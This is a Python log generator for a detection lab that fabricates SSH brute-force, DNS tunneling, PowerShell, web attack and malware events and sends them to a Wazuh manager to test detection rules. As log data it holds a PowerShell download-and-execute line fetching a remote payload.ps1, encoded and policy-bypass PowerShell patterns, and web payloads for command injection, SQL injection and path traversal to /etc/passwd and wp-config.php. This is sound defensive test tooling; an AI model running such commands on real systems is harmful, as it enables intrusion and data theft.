"""
Security Log Generator for Detection Lab
Generates realistic security events for testing detection rules
"""

import json
import random
import socket
import time
from datetime import datetime, timedelta
from typing import Dict, List, Any
import os
import sys

from faker import Faker
import yaml

fake = Faker()


class SecurityLogGenerator:
    """Generates various types of security logs for testing"""
    
    def __init__(self):
        self.wazuh_host = os.getenv('WAZUH_MANAGER_HOST', 'wazuh.manager')
        self.wazuh_port = int(os.getenv('WAZUH_MANAGER_PORT', '1514'))
        self.scenarios_path = '/app/scenarios'
        
        # Load attack scenarios
        self.scenarios = self._load_scenarios()
        
        # Common IP ranges for simulation
        self.internal_ips = ['192.168.1.0/24', '10.0.0.0/8', '172.16.0.0/12']
        self.external_ips = self._generate_external_ips()
        self.malicious_ips = self._load_malicious_ips()
        
        print(f"Log generator initialized - Target: {self.wazuh_host}:{self.wazuh_port}")
    
    def _load_scenarios(self) -> Dict[str, Any]:
        """Load attack scenarios from YAML files"""
        scenarios = {}
        
        try:
            scenario_files = [
                'ssh_bruteforce.yml',
                'dns_tunneling.yml',
                'powershell_attacks.yml',
                'web_attacks.yml',
                'malware_activity.yml'
            ]
            
            for filename in scenario_files:
                filepath = os.path.join(self.scenarios_path, filename)
                if os.path.exists(filepath):
                    with open(filepath, 'r') as f:
                        scenario_data = yaml.safe_load(f)
                        scenarios.update(scenario_data)
                        
        except Exception as e:
            print(f"Warning: Could not load scenarios: {e}")
            scenarios = self._get_default_scenarios()
        
        return scenarios
    
    def _get_default_scenarios(self) -> Dict[str, Any]:
        """Default scenarios if YAML files are not available"""
        return {
            'ssh_bruteforce': {
                'description': 'SSH brute force attack simulation',
                'frequency': 'high',
                'duration': 300,
                'patterns': [
                    'Failed password for {user} from {ip} port {port} ssh2',
                    'Invalid user {user} from {ip} port {port}',
                    'Connection closed by authenticating user {user} {ip} port {port} [preauth]'
                ]
            },
            'dns_tunneling': {
                'description': 'DNS tunneling simulation',
                'frequency': 'medium',
                'duration': 600,
                'patterns': [
                    'DNS query: {encoded_data}.{domain}',
                    'Suspicious DNS TXT query: {domain}',
                    'High frequency DNS queries from {ip}'
                ]
            }
        }
    
    def _generate_external_ips(self) -> List[str]:
        """Generate list of external IP addresses"""
        external_ips = []
        for _ in range(100):
            # Generate random public IP addresses
            ip = fake.ipv4_public()
            external_ips.append(ip)
        return external_ips
    
    def _load_malicious_ips(self) -> List[str]:
        """Load known malicious IP addresses"""
        # In a real scenario, this would load from threat intelligence feeds
        return [
            '185.220.101.182',  # Known Tor exit node
            '198.98.51.189',    # Known malicious IP
            '45.142.214.48',    # Suspicious IP
            '91.240.118.172',   # Known botnet IP
            '103.94.108.114'    # Malicious IP
        ]
    
    def generate_ssh_bruteforce_logs(self, count: int = 50) -> List[str]:
        """Generate SSH brute force attack logs"""
        logs = []
        attacker_ip = random.choice(self.malicious_ips)
        target_ip = fake.ipv4_private()
        
        usernames = ['root', 'admin', 'user', 'test', 'guest', 'oracle', 'postgres', 'mysql']
        
        for i in range(count):
            timestamp = datetime.now() - timedelta(seconds=random.randint(0, 3600))
            username = random.choice(usernames)
            port = random.randint(22, 2222)
            
            if i < count - 5:  # Most attempts fail
                log_entry = {
                    'timestamp': timestamp.isoformat(),
                    'level': 'WARNING',
                    'source': 'sshd',
                    'message': f'Failed password for {username} from {attacker_ip} port {port} ssh2',
                    'src_ip': attacker_ip,
                    'dst_ip': target_ip,
                    'username': username,
                    'port': port,
                    'protocol': 'ssh',
                    'event_type': 'authentication_failure'
                }
            else:  # Last few might succeed (indicating compromise)
                log_entry = {
                    'timestamp': timestamp.isoformat(),
                    'level': 'INFO',
                    'source': 'sshd',
                    'message': f'Accepted password for {username} from {attacker_ip} port {port} ssh2',
                    'src_ip': attacker_ip,
                    'dst_ip': target_ip,
                    'username': username,
                    'port': port,
                    'protocol': 'ssh',
                    'event_type': 'authentication_success'
                }
            
            logs.append(json.dumps(log_entry))
        
        return logs
    
    def generate_dns_tunneling_logs(self, count: int = 30) -> List[str]:
        """Generate DNS tunneling attack logs"""
        logs = []
        attacker_ip = random.choice(self.external_ips)
        tunnel_domain = f"{fake.word()}.{fake.domain_name()}"
        
        for i in range(count):
            timestamp = datetime.now() - timedelta(seconds=random.randint(0, 1800))
            
            # Generate base64-like encoded data
            encoded_data = fake.lexify('?' * random.randint(20, 60)).replace('?', random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'))
            
            query_types = ['A', 'TXT', 'CNAME', 'MX']
            query_type = random.choice(query_types)
            
            if query_type == 'TXT':
                query_name = f"{encoded_data}.{tunnel_domain}"
            else:
                query_name = f"{encoded_data[:20]}.{tunnel_domain}"
            
            log_entry = {
                'timestamp': timestamp.isoformat(),
                'level': 'INFO',
                'source': 'dns',
                'message': f'DNS query: {query_name} type {query_type}',
                'src_ip': attacker_ip,
                'query_name': query_name,
                'query_type': query_type,
                'query_length': len(query_name),
                'event_type': 'dns_query'
            }
            
            logs.append(json.dumps(log_entry))
        
        return logs
    
    def generate_powershell_attack_logs(self, count: int = 20) -> List[str]:
        """Generate PowerShell attack logs"""
        logs = []
        attacker_ip = random.choice(self.external_ips)
        target_host = fake.hostname()
        
        # PowerShell attack patterns
        attack_patterns = [
            'powershell.exe -EncodedCommand {encoded_cmd}',
            'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass {script}',
            'powershell.exe IEX (New-Object Net.WebClient).DownloadString("{url}")',
            'powershell.exe -c "[System.Reflection.Assembly]::Load({payload})"',
            'powershell.exe -NoProfile -NonInteractive -Command {obfuscated_cmd}'
        ]
        
        for i in range(count):
            timestamp = datetime.now() - timedelta(seconds=random.randint(0, 7200))
            pattern = random.choice(attack_patterns)
            
            if '{encoded_cmd}' in pattern:
                encoded_cmd = fake.lexify('?' * random.randint(50, 200)).replace('?', random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='))
                command = pattern.format(encoded_cmd=encoded_cmd)
            elif '{url}' in pattern:
                malicious_url = f"http://{fake.domain_name()}/payload.ps1"
                command = pattern.format(url=malicious_url)
            elif '{payload}' in pattern:
                payload = fake.lexify('?' * 100).replace('?', random.choice('0123456789ABCDEF'))
                command = pattern.format(payload=payload)
            elif '{script}' in pattern:
                script = f"Invoke-{fake.word().capitalize()}; Get-{fake.word().capitalize()}"
                command = pattern.format(script=script)
            else:
                obfuscated = ''.join([c + '`' if random.random() > 0.7 else c for c in fake.sentence()])
                command = pattern.format(obfuscated_cmd=obfuscated)
            
            log_entry = {
                'timestamp': timestamp.isoformat(),
                'level': 'WARNING',
                'source': 'windows_security',
                'message': f'Process created: {command}',
                'src_ip': attacker_ip,
                'hostname': target_host,
                'process_name': 'powershell.exe',
                'command_line': command,
                'event_type': 'process_creation',
                'event_id': 4688
            }
            
            logs.append(json.dumps(log_entry))
        
        return logs
    
    def generate_web_attack_logs(self, count: int = 25) -> List[str]:
        """Generate web attack logs"""
        logs = []
        
        # Web attack patterns
        attack_patterns = [
            "GET /admin/config.php?cmd=cat+/etc/passwd HTTP/1.1",
            "POST /login.php' OR '1'='1 HTTP/1.1",
            "GET /../../../etc/passwd HTTP/1.1",
            "POST /upload.php?file=shell.php HTTP/1.1",
            "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1"
        ]
        
        for i in range(count):
            timestamp = datetime.now() - timedelta(seconds=random.randint(0, 3600))
            attacker_ip = random.choice(self.malicious_ips)
            target_ip = fake.ipv4_private()
            
            attack = random.choice(attack_patterns)
            user_agent = fake.user_agent()
            
            log_entry = {
                'timestamp': timestamp.isoformat(),
                'level': 'WARNING',
                'source': 'apache',
                'message': f'{attacker_ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{attack}" 200 1234 "-" "{user_agent}"',
                'src_ip': attacker_ip,
                'dst_ip': target_ip,
                'method': attack.split()[0],
                'uri': attack.split()[1],
                'user_agent': user_agent,
                'status_code': random.choice([200, 403, 404, 500]),
                'event_type': 'web_request'
            }
            
            logs.append(json.dumps(log_entry))
        
        return logs
    
    def generate_malware_activity_logs(self, count: int = 15) -> List[str]:
        """Generate malware activity logs"""
        logs = []
        infected_host = fake.hostname()
        c2_server = random.choice(self.malicious_ips)
        
        malware_families = ['Emotet', 'TrickBot', 'Cobalt Strike', 'Metasploit', 'Empire']
        malware_family = random.choice(malware_families)
        
        for i in range(count):
            timestamp = datetime.now() - timedelta(seconds=random.randint(0, 7200))
            
            activity_types = [
                'network_connection',
                'file_creation',
                'registry_modification',
                'process_injection',
                'credential_theft'
            ]
            
            activity = random.choice(activity_types)
            
            if activity == 'network_connection':
                log_entry = {
                    'timestamp': timestamp.isoformat(),
                    'level': 'CRITICAL',
                    'source': 'endpoint_detection',
                    'message': f'Suspicious network connection to C2 server {c2_server}',
                    'hostname': infected_host,
                    'src_ip': fake.ipv4_private(),
                    'dst_ip': c2_server,
                    'dst_port': random.choice([80, 443, 8080, 8443]),
                    'malware_family': malware_family,
                    'event_type': 'malware_communication'
                }
            elif activity == 'file_creation':
                malicious_file = f"{fake.word()}.{random.choice(['exe', 'dll', 'bat', 'ps1'])}"
                log_entry = {
                    'timestamp': timestamp.isoformat(),
                    'level': 'HIGH',
                    'source': 'endpoint_detection',
                    'message': f'Malicious file created: {malicious_file}',
                    'hostname': infected_host,
                    'file_path': f"C:\\Users\\{fake.user_name()}\\AppData\\Local\\Temp\\{malicious_file}",
                    'file_hash': fake.md5(),
                    'malware_family': malware_family,
                    'event_type': 'malware_file_creation'
                }
            else:
                log_entry = {
                    'timestamp': timestamp.isoformat(),
                    'level': 'HIGH',
                    'source': 'endpoint_detection',
                    'message': f'Malware activity detected: {activity}',
                    'hostname': infected_host,
                    'malware_family': malware_family,
                    'activity_type': activity,
                    'event_type': 'malware_activity'
                }
            
            logs.append(json.dumps(log_entry))
        
        return logs
    
    def send_logs_to_wazuh(self, logs: List[str]):
        """Send logs to Wazuh manager via syslog"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            for log in logs:
                # Format as syslog message
                syslog_msg = f"<134>1 {datetime.now().isoformat()}Z detection-lab-generator - - - {log}"
                sock.sendto(syslog_msg.encode('utf-8'), (self.wazuh_host, self.wazuh_port))
                
                # Small delay to avoid overwhelming
                time.sleep(0.1)
            
            sock.close()
            print(f"Sent {len(logs)} logs to Wazuh")
            
        except Exception as e:
            print(f"Error sending logs to Wazuh: {e}")
            # Fallback: write to file
            self.write_logs_to_file(logs)
    
    def write_logs_to_file(self, logs: List[str], filename: str = None):
        """Write logs to file as fallback"""
        if not filename:
            filename = f"/app/logs/security_events_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
        try:
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            with open(filename, 'w') as f:
                for log in logs:
                    f.write(log + '\n')
            print(f"Wrote {len(logs)} logs to {filename}")
        except Exception as e:
            print(f"Error writing logs to file: {e}")
    
    def run_simulation(self, duration_minutes: int = 60):
        """Run continuous simulation for specified duration"""
        print(f"Starting security simulation for {duration_minutes} minutes...")
        
        start_time = time.time()
        end_time = start_time + (duration_minutes * 60)
        
        scenario_weights = {
            'ssh_bruteforce': 0.3,
            'dns_tunneling': 0.2,
            'powershell_attacks': 0.2,
            'web_attacks': 0.2,
            'malware_activity': 0.1
        }
        
        while time.time() < end_time:
            # Randomly select scenario based on weights
            scenario = random.choices(
                list(scenario_weights.keys()),
                weights=list(scenario_weights.values())
            )[0]
            
            print(f"Generating {scenario} scenario...")
            
            if scenario == 'ssh_bruteforce':
                logs = self.generate_ssh_bruteforce_logs(random.randint(10, 50))
            elif scenario == 'dns_tunneling':
                logs = self.generate_dns_tunneling_logs(random.randint(15, 30))
            elif scenario == 'powershell_attacks':
                logs = self.generate_powershell_attack_logs(random.randint(5, 20))
            elif scenario == 'web_attacks':
                logs = self.generate_web_attack_logs(random.randint(10, 25))
            elif scenario == 'malware_activity':
                logs = self.generate_malware_activity_logs(random.randint(5, 15))
            
            # Send logs
            self.send_logs_to_wazuh(logs)
            
            # Wait before next scenario
            wait_time = random.randint(30, 180)  # 30 seconds to 3 minutes
            print(f"Waiting {wait_time} seconds before next scenario...")
            time.sleep(wait_time)
        
        print("Simulation completed!")


def main():
    """Main function"""
    generator = SecurityLogGenerator()
    
    # Check command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == 'single':
            # Generate single batch of each type
            print("Generating single batch of each attack type...")
            
            scenarios = [
                ('SSH Brute Force', generator.generate_ssh_bruteforce_logs(20)),
                ('DNS Tunneling', generator.generate_dns_tunneling_logs(15)),
                ('PowerShell Attacks', generator.generate_powershell_attack_logs(10)),
                ('Web Attacks', generator.generate_web_attack_logs(15)),
                ('Malware Activity', generator.generate_malware_activity_logs(8))
            ]
            
            for name, logs in scenarios:
                print(f"Sending {name} logs...")
                generator.send_logs_to_wazuh(logs)
                time.sleep(5)  # Brief pause between scenarios
                
        elif sys.argv[1] == 'continuous':
            # Run continuous simulation
            duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
            generator.run_simulation(duration)
        else:
            print("Usage: python log_generator.py [single|continuous [duration_minutes]]")
    else:
        # Default: run continuous simulation for 30 minutes
        generator.run_simulation(30)


if __name__ == "__main__":
    main()